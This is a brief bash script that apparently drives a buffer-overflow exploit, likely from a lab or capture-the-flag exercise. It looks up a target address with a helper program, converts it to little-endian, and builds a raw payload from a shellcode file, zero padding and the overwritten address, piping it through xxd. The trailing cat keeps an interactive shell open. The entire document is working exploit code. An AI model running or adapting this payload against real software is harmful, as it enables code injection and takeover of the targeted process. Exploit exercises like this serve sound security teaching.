#!/bin/bash

./findAddress
addr=`cat PasswordAddr`
lil_endian_addr=`printf %016x $addr | tac -rs..`
( cat shellcode; printf %0240d 0; echo $lil_endian_addr) | xxd -r -p 
echo
( (cat shellcode; printf %0100d 0) | xxd -r -p; cat)

